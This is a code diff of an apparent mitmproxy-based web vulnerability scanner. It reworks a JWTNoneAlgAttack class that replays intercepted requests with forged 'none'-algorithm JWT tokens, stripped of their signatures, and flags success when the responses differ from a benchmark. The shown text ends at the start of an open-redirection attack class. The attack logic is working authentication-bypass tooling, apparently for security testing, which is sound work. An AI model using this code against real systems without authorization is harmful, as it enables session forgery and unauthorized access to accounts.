@@ -24,49 +24,50 @@ class RequestLogger:
         print(flow.request)
 
 class JWTNoneAlgAttack:
-    ATTACK_LABEL = 'JWT_NONE_ALG'
-    FAULTY_LABEL = 'FAULTY_JWT_TOKEN'
+    BENCHMARK_LABEL = 'JWT_NONE_ALG_BENCHMARK' # label for the benchmark failing flow
+    ATTACK_LABEL = 'JWT_NONE_ALG_ATTACK' # label for the attack flow
 
-    # looks for JWT tokens in the request and logs them
     def request(self, flow: http.HTTPFlow):
-        if hasattr(flow.request, 'ignore'):
-            return
-        
-        
-        print(f'path: {flow.request.path}\npath components: {flow.request.path_components}')
-        print('path home')
-
-        auth_token = get_jwt(flow.request.cookies)
-        if auth_token is None:
+        if get_jwt(flow.request.cookies) is None:
             return # No JWT token
         
-        print(f'Request {flow.request}\n<->\nResponse {flow.response}')
-
-        if self.FAULTY_FLOW is None:
-            faulty_token = generate_faulty_token(auth_token)
-            faulty_request = flow.copy()
-            faulty_request.request.cookies['token'] = faulty_token
-            faulty_request.request.label = self.FAULTY_LABEL
-            faulty_request.request.ignore = True
-            replay_flow(faulty_request)
+        if flow.request.path.find('socket.io') != -1:
+            return # socket.io request
         
-        print('-=' * 20)
+        if not hasattr(flow, 'label'):
+            benchmark_flow = flow.copy()
+            benchmark_flow.label = self.BENCHMARK_LABEL
+            benchmark_flow.request.headers.pop('Authorization', None)
+            benchmark_flow.request.cookies['token'] = generate_none_token_with_signature(get_jwt(flow.request.cookies))
+            replay_flow(benchmark_flow)
 
-        # while self.FAULTY_FLOW is None:
-        #     pass
 
-
-
-        return
-    
     def response(self, flow: http.HTTPFlow):
-        if flow.request.label == self.FAULTY_LABEL:
-            print('[]' * 20)
-            self.FAULTY_FLOW = flow
-            print(self.FAULTY_FLOW.response.text)
-            print(self.FAULTY_FLOW.response.status_code)
-            print('[]' * 20)
+        if get_jwt(flow.request.cookies) is None:
+            return # No JWT token
         
+        if flow.request.path.find('socket.io') != -1:
+            return # socket.io request
+
+        if not hasattr(flow, 'label'):
+            return # No label attribute (not a replayed request i.e. original request)
+        
+        if flow.label == self.BENCHMARK_LABEL:
+            attack_flow = flow.copy()
+            attack_flow.label = self.ATTACK_LABEL
+            attack_flow.benchmark_hash = hash(flow.response.text)
+            attack_flow.request.headers.pop('Authorization', None)
+            attack_flow.request.cookies['token'] = drop_token_signature(get_jwt(flow.request.cookies))
+            replay_flow(attack_flow)
+        elif flow.label == self.ATTACK_LABEL:    
+            if flow.benchmark_hash != hash(flow.response.text):
+                print('__' * 25)
+                print(self.ATTACK_LABEL, 'SUCCESS!!', flow.request.pretty_url)
+                print('__' * 25, '\n')
+            else:
+                pass # attack failed
+        else:
+            pass # not a replayed request
 
 class OpenRedirectionAttack:
     REF_ATTACK_URL = 'http://google.com'
